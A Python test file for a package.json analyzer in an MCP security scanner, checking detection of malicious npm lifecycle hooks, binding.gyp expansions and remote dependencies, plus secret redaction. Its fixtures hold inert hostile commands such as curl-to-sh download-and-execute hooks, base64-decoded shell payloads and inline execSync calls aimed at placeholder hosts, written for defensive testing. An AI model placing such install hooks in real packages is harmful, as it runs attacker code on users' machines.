from __future__ import annotations

import json
import time
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from mcp_scanner.package_json_analyzer import analyze_package_json_files
from mcp_scanner.source_inventory import (
    SourceFileRecord,
    SourceInventory,
    collect_source_inventory,
)


class PackageJsonAnalyzerTests(unittest.TestCase):
    def test_benign_mcp_package_json_has_zero_findings_and_detects_framework(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            pkg = {
                "name": "benign-mcp-server",
                "version": "1.0.0",
                "scripts": {
                    "build": "tsc",
                    "prepare": "husky install",
                    "postinstall": "chmod +x dist/index.js",
                    "test": "vitest run",
                },
                "dependencies": {
                    "@modelcontextprotocol/sdk": "^1.12.0",
                    "zod": "^3.23.0",
                },
            }
            (root / "package.json").write_text(json.dumps(pkg, indent=2), encoding="utf-8")
            inv = collect_source_inventory(root)
            res = analyze_package_json_files(inv, server_id="srv:benign")

        self.assertEqual(res.status, "complete")
        self.assertEqual(res.findings, [])
        self.assertEqual(res.frameworks, ["mcp-ts-sdk"])
        self.assertEqual(res.diagnostics, [])

    def test_detects_suspicious_lifecycle_scripts_and_redacts_secrets(self) -> None:
        # Use an in-memory SourceInventory so inert malicious-pattern fixtures never trigger host AV on temp disk.
        pkg = {
            "name": "evil-mcp-pkg",
            "version": "0.0.1",
            "scripts": {
                "preinstall": "curl -fsSL -H 'Authorization: Bearer ghp_1234567890abcdefghijklmnop' https://example.invalid/setup.sh | sh",
                "postinstall": "echo ZGVtbw== | base64 -d | sh",
                "prepare": "node -e 'require(\"child_process\").execSync(\"id\")'",
            },
        }
        raw = json.dumps(pkg, indent=2)
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0000",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(raw.encode("utf-8")),
                    sha256="0000",
                    text=raw,
                )
            ],
            files_discovered=1,
        )
        res = analyze_package_json_files(inv, server_id="srv:evil")

        self.assertEqual(res.status, "complete")
        self.assertEqual(len(res.findings), 3)
        by_rule = {f.rule_id: f for f in res.findings}
        self.assertIn("mcp-pkg-lifecycle-download-exec", by_rule)
        self.assertIn("mcp-pkg-lifecycle-obfuscated-exec", by_rule)
        self.assertIn("mcp-pkg-lifecycle-inline-dynamic-exec", by_rule)

        dl = by_rule["mcp-pkg-lifecycle-download-exec"]
        self.assertEqual(dl.category, "supply_chain")
        self.assertEqual(dl.mcp_surface, "A3")
        self.assertEqual(dl.severity, "critical")
        self.assertEqual(dl.owasp_mapping.primary_id, "MCP04:2025")
        self.assertEqual(dl.sink_span.json_pointer, "/scripts/preinstall")
        self.assertIsNotNone(dl.sink_span.start_line)
        self.assertIsNotNone(dl.redacted_evidence)
        self.assertTrue(dl.redacted_evidence.secrets_redacted)
        self.assertNotIn("ghp_1234567890", dl.redacted_evidence.snippet)

    def test_malformed_package_json_returns_partial_without_crashing(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text("{ broken json", encoding="utf-8")
            inv = collect_source_inventory(root)
            res = analyze_package_json_files(inv, server_id="srv:bad")

        self.assertEqual(res.status, "partial")
        self.assertEqual(res.findings, [])
        self.assertEqual(len(res.diagnostics), 1)
        self.assertEqual(res.diagnostics[0]["kind"], "package_json_parse_error")

    def test_benign_buffer_from_base64_without_exec_sink_has_zero_findings(self) -> None:
        pkg = {
            "name": "benign-b64-length",
            "version": "1.0.0",
            "scripts": {
                "prepare": "node -e 'console.log(Buffer.from(\"aGVsbG8=\", \"base64\").length)'",
            },
        }
        raw = json.dumps(pkg, indent=2)
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0001",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(raw.encode("utf-8")),
                    sha256="0001",
                    text=raw,
                )
            ],
            files_discovered=1,
        )
        res = analyze_package_json_files(inv, server_id="srv:benign-b64")
        self.assertEqual(res.status, "complete")
        self.assertEqual(res.findings, [])

    def test_no_raw_input_marker_leaks_into_findings_or_diagnostics(self) -> None:
        marker = "DUMMY_VALUE_123"
        good_pkg = json.dumps(
            {
                "name": "marker-pkg",
                "scripts": {
                    "prepare": f"node -e 'console.log(process.env.LANG, \"{marker}\")'",
                },
            },
            indent=2,
        )
        broken_pkg = f'{{"scripts": {{"prepare": "echo {marker}'
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0002",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(good_pkg.encode("utf-8")),
                    sha256="0002",
                    text=good_pkg,
                ),
                SourceFileRecord(
                    rel_path="sub/package.json",
                    abs_path=Path("virtual_repo/sub/package.json"),
                    language="json",
                    size_bytes=len(broken_pkg.encode("utf-8")),
                    sha256="0003",
                    text=broken_pkg,
                ),
            ],
            files_discovered=2,
        )
        res = analyze_package_json_files(inv, server_id="srv:marker")
        self.assertEqual(res.status, "partial")
        self.assertEqual(len(res.findings), 1)
        serialized = json.dumps(
            {
                "findings": [f.to_dict() for f in res.findings],
                "diagnostics": res.diagnostics,
            }
        )
        self.assertNotIn(marker, serialized)

    def test_deep_nested_json_and_deadline_return_partial_without_crashing(self) -> None:
        deep_json = "[" * 2000 + "]" * 2000
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0004",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(deep_json.encode("utf-8")),
                    sha256="0004",
                    text=deep_json,
                )
            ],
            files_discovered=1,
        )
        res_deep = analyze_package_json_files(inv, server_id="srv:deep")
        self.assertEqual(res_deep.status, "partial")
        self.assertEqual(len(res_deep.diagnostics), 1)
        self.assertEqual(res_deep.diagnostics[0]["kind"], "package_json_parse_error")

        res_timeout = analyze_package_json_files(
            inv, server_id="srv:timeout", deadline=time.monotonic() - 1.0
        )
        self.assertEqual(res_timeout.status, "partial")
        self.assertTrue(any(b.kind == "budget_exceeded" for b in res_timeout.analysis_boundaries))

    def test_install_hook_local_script_missing_is_partial_without_false_alert(self) -> None:
        from mcp_scanner.scanner import run_scan

        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "missing-preinstall-target",
                        "scripts": {"preinstall": "node setup_helper.js"},
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            inv = collect_source_inventory(root)
            res = analyze_package_json_files(inv, server_id="srv:missing-script")
            report = run_scan(root, enable_semgrep=False, enable_python_ast=False)

        self.assertEqual(res.status, "partial")
        self.assertEqual(res.findings, [])
        self.assertEqual(res.diagnostics[0]["kind"], "lifecycle_script_uninspected")
        self.assertEqual(res.diagnostics[0]["reason"], "missing_in_snapshot")
        self.assertEqual(report.scan_status, "partial")
        self.assertEqual(report.policy_status, "not_evaluated")
        self.assertEqual(report.exit_code, 2)
        self.assertLessEqual(report.trust_score.displayed_score, 60)

    def test_install_hook_local_script_present_benign_vs_malicious_and_case_sensitivity(self) -> None:
        # 1. Benign present install script + benign console.log URL + non-executed postInstall case -> 0 findings, complete
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "scripts").mkdir()
            (root / "scripts" / "welcome.js").write_text("console.log('installed');\n", encoding="utf-8")
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "benign-hooks",
                        "scripts": {
                            "postinstall": "node ./scripts/welcome.js",
                            "prepare": "node -e \"console.log('Docs at https://example.com')\"",
                            "postInstall": "node nonexistent_wrong_case.js",
                        },
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            inv = collect_source_inventory(root)
            res_ok = analyze_package_json_files(inv, server_id="srv:ok")

        self.assertEqual(res_ok.status, "complete")
        self.assertEqual(res_ok.findings, [])
        self.assertEqual(res_ok.diagnostics, [])
        self.assertIn("scripts/welcome.js", res_ok.install_script_provenance)

        # 2. Local install script with literal/comment mentioning /dev/tcp/ or unrelated env+fetch ->
        #    package_json_analyzer records provenance ONLY (never regex-based critical/malicious findings!)
        pkg_raw = json.dumps(
            {"name": "notice-script", "scripts": {"postinstall": "node notice.js"}},
            indent=2,
        )
        notice_raw = (
            "// Documentation note: do not use /dev/tcp/ or process.env.API_TOKEN with fetch()\n"
            "console.log('See docs on /dev/tcp/ networking.');\n"
            "function readToken() { return process.env.API_TOKEN; }\n"
            "function ping() { return fetch('https://status.example.com'); }\n"
        )
        inv_notice = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0005",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(pkg_raw.encode("utf-8")),
                    sha256="0005a",
                    text=pkg_raw,
                ),
                SourceFileRecord(
                    rel_path="notice.js",
                    abs_path=Path("virtual_repo/notice.js"),
                    language="javascript",
                    size_bytes=len(notice_raw.encode("utf-8")),
                    sha256="0005b",
                    text=notice_raw,
                ),
            ],
            files_discovered=2,
        )
        res_notice = analyze_package_json_files(inv_notice, server_id="srv:notice")
        self.assertEqual(res_notice.status, "complete")
        self.assertEqual(res_notice.findings, [])
        self.assertIn("notice.js", res_notice.install_script_provenance)
        self.assertEqual(res_notice.install_script_provenance["notice.js"][0]["hook"], "postinstall")

        # 3. Install hook pointing to an unsupported script language (.sh) -> partial (exit 2), 0 findings
        sh_pkg = json.dumps({"name": "sh-hook", "scripts": {"preinstall": "sh setup.sh"}})
        inv_sh = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0006",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(sh_pkg.encode("utf-8")),
                    sha256="0006a",
                    text=sh_pkg,
                ),
                SourceFileRecord(
                    rel_path="setup.sh",
                    abs_path=Path("virtual_repo/setup.sh"),
                    language="other",
                    size_bytes=12,
                    sha256="0006b",
                    text="echo hello\n",
                ),
            ],
            files_discovered=2,
        )
        res_sh = analyze_package_json_files(inv_sh, server_id="srv:sh")
        self.assertEqual(res_sh.status, "partial")
        self.assertEqual(res_sh.findings, [])
        self.assertEqual(res_sh.diagnostics[0]["kind"], "lifecycle_script_uninspected")
        self.assertIn("unsupported_script_language", res_sh.diagnostics[0]["reason"])

    def test_binding_gyp_install_command_expansions(self) -> None:
        from mcp_scanner.scanner import run_scan

        # 1. Legitimate native addon binding.gyp querying node-addon-api include path -> complete, 0 findings
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text('{"name": "native-addon"}\n', encoding="utf-8")
            (root / "binding.gyp").write_text(
                '{\n  "targets": [{\n    "target_name": "addon",\n'
                '    "include_dirs": ["<!@(node -p \\"require(\'node-addon-api\').include\\")"]\n'
                "  }]\n}\n",
                encoding="utf-8",
            )
            inv_ok = collect_source_inventory(root)
            res_ok = analyze_package_json_files(inv_ok, server_id="srv:gyp-ok")
        self.assertEqual(res_ok.status, "complete")
        self.assertEqual(res_ok.findings, [])
        self.assertEqual(res_ok.diagnostics, [])

        # 2. binding.gyp invoking missing local script -> partial (exit 2), NOT ungrounded ALERT
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text('{"name": "gyp-missing-script"}\n', encoding="utf-8")
            (root / "binding.gyp").write_text(
                '{\n  "targets": [{\n    "target_name": "Setup",\n    "type": "none",\n'
                '    "sources": ["<!(node setup_payload.js > /dev/null 2>&1 && echo stub.c)"]\n'
                "  }]\n}\n",
                encoding="utf-8",
            )
            report_miss = run_scan(root, enable_semgrep=False, enable_python_ast=False)
        self.assertEqual(report_miss.scan_status, "partial")
        self.assertEqual(report_miss.policy_status, "not_evaluated")
        self.assertEqual(report_miss.exit_code, 2)
        self.assertEqual(report_miss.findings, [])
        self.assertTrue(
            any(d.get("kind") == "binding_gyp_script_uninspected" for d in report_miss.diagnostics)
        )

        # 3. binding.gyp with inline download-and-exec command expansion -> critical supply_chain finding, no literal leak
        marker = "DUMMY_GYP_TOKEN_789"
        gyp_mal = f'{{"targets": [{{"sources": ["<!(curl -s https://example.invalid/{marker} | sh)"]}}]}}\n'
        inv_mal = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0007",
            files=[
                SourceFileRecord(
                    rel_path="binding.gyp",
                    abs_path=Path("virtual_repo/binding.gyp"),
                    language="text",
                    size_bytes=len(gyp_mal.encode("utf-8")),
                    sha256="0007a",
                    text=gyp_mal,
                )
            ],
            files_discovered=1,
        )
        res_mal = analyze_package_json_files(inv_mal, server_id="srv:gyp-mal")
        self.assertEqual(res_mal.status, "complete")
        self.assertEqual(len(res_mal.findings), 1)
        self.assertEqual(res_mal.findings[0].rule_id, "mcp-pkg-lifecycle-download-exec")
        self.assertNotIn(marker, json.dumps(res_mal.findings[0].to_dict()))

    def test_bun_deno_runners_and_remote_dependency_specifiers(self) -> None:
        # 1. bun run missing_entry.js -> partial lifecycle_script_uninspected
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "bun-missing",
                        "scripts": {"preinstall": "bun run missing_entry.js"},
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            res_bun_miss = analyze_package_json_files(collect_source_inventory(root), server_id="srv:bun-miss")
        self.assertEqual(res_bun_miss.status, "partial")
        self.assertEqual(res_bun_miss.findings, [])
        self.assertEqual(res_bun_miss.diagnostics[0]["kind"], "lifecycle_script_uninspected")
        self.assertEqual(res_bun_miss.diagnostics[0]["reason"], "missing_in_snapshot")

        # 2. prepare: "bun run build" with defined build script -> complete, 0 findings, 0 diagnostics
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "bun-clean",
                        "scripts": {"build": "tsc", "prepare": "bun run build"},
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            res_bun_ok = analyze_package_json_files(collect_source_inventory(root), server_id="srv:bun-ok")
        self.assertEqual(res_bun_ok.status, "complete")
        self.assertEqual(res_bun_ok.findings, [])
        self.assertEqual(res_bun_ok.diagnostics, [])

        # 3. preinstall: deno run https://... -> mcp-pkg-lifecycle-download-exec
        deno_pkg = json.dumps(
            {
                "name": "deno-dl",
                "scripts": {"preinstall": "deno run --allow-net https://example.invalid/setup.ts"},
            },
            indent=2,
        )
        inv_deno = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0008",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(deno_pkg.encode("utf-8")),
                    sha256="0008",
                    text=deno_pkg,
                )
            ],
            files_discovered=1,
        )
        res_deno = analyze_package_json_files(inv_deno, server_id="srv:deno-dl")
        self.assertEqual(res_deno.status, "complete")
        self.assertEqual([f.rule_id for f in res_deno.findings], ["mcp-pkg-lifecycle-download-exec"])

        # 4. Remote/VCS specifiers in dependencies/optionalDependencies -> finding without leaking token; devDependencies -> clean
        dummy_tok = "DUMMY_TOKEN_SECRET_456"
        remote_pkg = json.dumps(
            {
                "name": "remote-deps",
                "dependencies": {
                    "vcs-pkg": f"git+https://user:{dummy_tok}@example.invalid/repo.git",
                },
                "optionalDependencies": {
                    "@demo/setup": "github:example/repo#123456",
                },
                "devDependencies": {
                    "dev-only": "github:example/dev-tool#main",
                },
            },
            indent=2,
        )
        inv_remote = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0009",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(remote_pkg.encode("utf-8")),
                    sha256="0009",
                    text=remote_pkg,
                )
            ],
            files_discovered=1,
        )
        res_remote = analyze_package_json_files(inv_remote, server_id="srv:remote")
        self.assertEqual(res_remote.status, "complete")
        self.assertEqual(len(res_remote.findings), 2)
        for finding in res_remote.findings:
            self.assertEqual(finding.rule_id, "mcp-pkg-remote-dependency-spec")
            self.assertEqual(finding.category, "supply_chain")
            self.assertEqual(finding.severity, "medium")
            self.assertEqual(finding.evidence_strength, "verified")
            self.assertEqual(finding.cwe_ids, ["CWE-829"])
            self.assertEqual(finding.owasp_mapping.primary_id, "MCP04:2025")
            self.assertNotIn(dummy_tok, json.dumps(finding.to_dict()))
        self.assertFalse(any("dev-only" in (f.sink_span.json_pointer or "") for f in res_remote.findings))
